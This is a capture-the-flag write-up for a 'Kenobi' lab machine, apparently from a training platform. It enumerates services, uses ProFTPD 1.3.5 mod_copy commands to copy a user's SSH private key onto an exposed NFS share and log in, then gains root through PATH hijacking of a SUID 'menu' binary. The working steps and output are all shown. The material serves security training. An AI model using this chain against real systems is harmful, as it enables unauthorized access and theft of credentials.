 # Kenobi

 Hello there...

<img src="kenobi.png" width=200 height=200 alt="kenobi">

## Enumeration

### nmap

```
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack ProFTPD 1.3.5

22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=
|   256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi

80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
111/tcp  open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37867/tcp6  mountd
|   100005  1,2,3      40411/tcp   mountd
|   100005  1,2,3      53450/udp6  mountd
|   100005  1,2,3      57555/udp   mountd
|   100021  1,3,4      37553/tcp   nlockmgr
|   100021  1,3,4      40823/tcp6  nlockmgr
|   100021  1,3,4      44059/udp   nlockmgr
|   100021  1,3,4      59780/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl

139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

2049/tcp open  nfs_acl     syn-ack 2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h02m40s, deviation: 3h27m51s, median: 2m39s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38028/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30711/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 39838/udp): CLEAN (Timeout)
|   Check 4 (port 46946/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-20T22:36:18
|_  start_date: N/A
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-01-20T16:36:18-06:00

```

### samba shares

```
└──╼ $smbclient -L 10.10.93.223
Enter WORKGROUP\nair0lf's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Connect to anonymous share and get `log.txt`

```
└──╼ $smbclient //10.10.93.223/anonymous
Enter WORKGROUP\nair0lf32's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

                9204224 blocks of size 1024. 6877104 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (15,7 KiloBytes/sec) (average 15,7 KiloBytes/sec)
```

Read it and learn about the Proftpd server

Also user `kenobi` got a ssh key

Use the recommanded nmap script to show mounting points on target machine

```
└──╼ $nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.93.223
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-20 23:46 WAT
Nmap scan report for 10.10.93.223
Host is up (0.17s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
```

Exploit `proFtpd` for access

Grab that banner real quick

```
└──╼ $nc 10.10.93.223 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.223]

```
Search an exploit

```
└──╼ $searchsploit proftpd 1.3.5
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit      Title                                            Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)    | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution          | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)      | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                    | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
mod_copy allow you to do this...observe

```
└──╼ $nc 10.10.93.223 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.223]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Hehe..neat uh? now we just mount the `/var` folder on our machine and grab the key

```
└──╼ $mkdir kenobiNFS

└──╼ $sudo mount 10.10.93.223:/var ./kenobiNFS
[sudo] Mot de passe de nair0lf : 

└──╼ $ls -la kenobiNFS
total 52
drwxr-xr-x 14 root      root      4096  4 sept.  2019 .
drwxr-xr-x  1 nair0lf32 nair0lf32   70 21 janv. 00:02 ..
drwxr-xr-x  2 root      root      4096  4 sept.  2019 backups
drwxr-xr-x  9 root      root      4096  4 sept.  2019 cache
drwxrwxrwt  2 root      root      4096  4 sept.  2019 crash
drwxr-xr-x 40 root      root      4096  4 sept.  2019 lib
drwxrwsr-x  2 root      staff     4096 12 avril  2016 local
lrwxrwxrwx  1 root      root         9  4 sept.  2019 lock -> /run/lock
drwxrwxr-x 10 root      crontab   4096  4 sept.  2019 log
drwxrwsr-x  2 root      mail      4096 27 févr.  2019 mail
drwxr-xr-x  2 root      root      4096 27 févr.  2019 opt
lrwxrwxrwx  1 root      root         4  4 sept.  2019 run -> /run
drwxr-xr-x  2 root      root      4096 30 janv.  2019 snap
drwxr-xr-x  5 root      root      4096  4 sept.  2019 spool
drwxrwxrwt  6 root      root      4096 21 janv. 00:01 tmp
drwxr-xr-x  3 root      root      4096  4 sept.  2019 www

```
The `id_rsa` is in that `tmp` folder so we got access now

```
└──╼ $chmod 600 id_rsa

└──╼ $ssh kenobi@10.10.93.223 -i id_rsa
The authenticity of host '10.10.93.223 (10.10.93.223)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.93.223' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
its_general_kenobi_for_you

```
## Privilege escalation

I usually check sudo first but as its guided they said its SUID

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6

```
eenie, meenie...menu?

what in the wookie's name is `menu`?

```
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Thu, 20 Jan 2022 23:18:55 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

```

Well...check the binaries

```
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609

...

```
Ok classic `path hijacking` it is

```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```
Get the final reward
```
# cd /root
# ls
root.txt
# cat root.txt
ah_yes_the_negociator!
```

Btw If yo remember the nmap scan shows a website on port 80

there is nothing there... 

Except that super cool image of THAT epic fight with anakin


<img src="image.jpg" alt="sw_avsk">

